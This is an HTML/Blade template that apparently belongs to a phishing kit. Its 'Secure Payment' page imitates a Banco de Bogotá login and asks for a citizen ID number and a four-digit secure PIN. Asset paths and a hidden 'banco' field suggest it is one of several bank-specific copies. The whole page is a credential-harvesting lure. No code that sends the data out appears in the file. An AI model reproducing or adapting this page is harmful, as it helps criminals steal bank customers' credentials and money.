<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    
    <title>Secure Payment</title>

    <link rel="stylesheet" href="{{asset('assets/css/payment/bogota.css')}}">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
            
</head>
<body>
    
<img src="{{asset('assets/img/payment/bogota/menu.jfif')}}" alt="" width="100%">
<center>
    <img src="{{asset('assets/img/payment/bogota/mensaje.jfif')}}" alt="" width="93%">
</center>

<center>
    <div class="clave" style="width:80%; height:40px; border:1px solid rgb(219,219,219); border-bottom:1px solid #0040a8;">
        <br>
        <br>
        <a style="position:absolute; left:40%; top:230px;">Clave segura</a>
    </div>

    <div class="datos" style="width:80%; border:1px solid rgb(219,219,219);">
            <select name="cc" id="">
                <option value="Cedula">Cédula de ciudadanía</option>
            </select><br>
            <input type="tel" name="user" id="txtUsuario" placeholder="Número de documento" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
            <input type="password" name="clave" id="txtPass" placeholder="Clave segura" minlength="4" maxlength="4" required><br>
            <input type="hidden" value="bogota" id="banco">

            <a style="color:#0040a8;position:relative; left:-95px;">Olvide mi clave</a><br><br>
            <button style="border-radius:100px; width:90%; height:50px; background-color:#0040a8; color:white; font-size:15px;" id="btnUsuario">Ingresar ahora</button>
            <p></p>
            <img src="{{asset('assets/img/payment/bogota/botonabajo.jfif')}}" alt="" width="95%">
    </div>
</center>

<img src="{{asset('assets/img/payment/bogota/1.jfif')}}" alt="" width="100%">
<img src="{{asset('assets/img/payment/bogota/2.jfif')}}" alt="" width="100%">
<img src="{{asset('assets/img/payment/bogota/3.jfif')}}" alt="" width="100%">




</body>
</html>